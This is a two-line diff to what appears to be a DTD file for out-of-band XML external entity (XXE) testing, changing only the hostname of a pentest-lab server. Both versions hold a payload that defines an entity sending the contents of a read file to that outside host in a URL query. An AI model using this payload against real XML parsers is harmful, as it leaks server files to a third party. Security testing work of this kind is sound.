@@ -1,2 +1,2 @@
-<?xml version="1.0" encoding="UTF-8"?> <!ENTITY % all "<!ENTITY send SYSTEM 'http://xxepayload.pentestlabs.uk/?%file;'>"> %all;
+<?xml version="1.0" encoding="UTF-8"?> <!ENTITY % all "<!ENTITY send SYSTEM 'http://xxehttppayload.pentestlabs.uk/?%file;'>"> %all;
 
